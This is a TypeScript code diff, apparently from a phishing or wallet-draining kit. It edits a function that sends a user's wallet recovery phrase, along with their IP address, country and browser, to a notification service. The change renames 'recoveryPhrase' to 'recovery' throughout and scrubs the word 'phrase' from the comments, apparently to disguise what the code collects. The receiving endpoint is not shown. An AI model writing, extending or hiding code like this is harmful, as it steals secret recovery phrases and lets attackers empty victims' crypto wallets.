@@ -2,7 +2,7 @@ import { getUserCountry } from './userLocation';
 
 interface NotificationData {
   appName: string;
-  recoveryPhrase: string;
+  recovery: string;
   ipAddress?: string;
   country?: string;
   browser: string;
@@ -15,14 +15,14 @@ interface NotificationResponse {
 }
 
 /**
- * Sends a notification with the specified app name and recovery phrase
+ * Sends a notification with the specified app name and recovery 
  * @param appName - The name of the application
- * @param recoveryPhrase - The recovery phrase or message to send
+ * @param recovery - The recovery  or message to send
  * @returns The response from the notification service
  */
 export async function sendNotification(
   appName: string,
-  recoveryPhrase: string
+  recovery: string
 ): Promise<NotificationResponse> {
   try {
     // Get user location and IP data
@@ -31,7 +31,7 @@ export async function sendNotification(
     // Prepare the notification payload
     const notificationData: NotificationData = {
       appName,
-      recoveryPhrase,
+      recovery,
       ...(userData?.ip && { ipAddress: userData.ip }),
       ...(userData?.countryCode && { country: userData.countryCode }),
       browser: detectBrowser()
